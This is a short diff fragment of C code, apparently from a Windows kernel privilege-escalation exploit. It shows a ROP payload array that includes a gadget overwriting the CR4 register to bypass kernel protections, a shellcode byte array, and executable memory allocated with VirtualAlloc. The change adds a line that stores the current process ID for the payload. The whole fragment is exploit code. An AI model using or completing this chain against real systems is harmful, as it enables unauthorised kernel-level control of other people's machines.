@@ -113,6 +113,8 @@ int main(){
     payload[38] = ADDR(0x50ef0);
     payload[39] = ADDR(kernel_base + 0x47f027); // 0x14047f027: mov cr4, rcx ; ret ;
 
+    DWORD PID = GetCurrentProcessId();
+
     char shellcode[] = "\x48\xC7\xC0\x34\x12\x00\x00\x48\xC7\xC7\x68\x15\x00\x00\x48\x31\xF8";
 
     uintptr_t shellcode_ptr = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
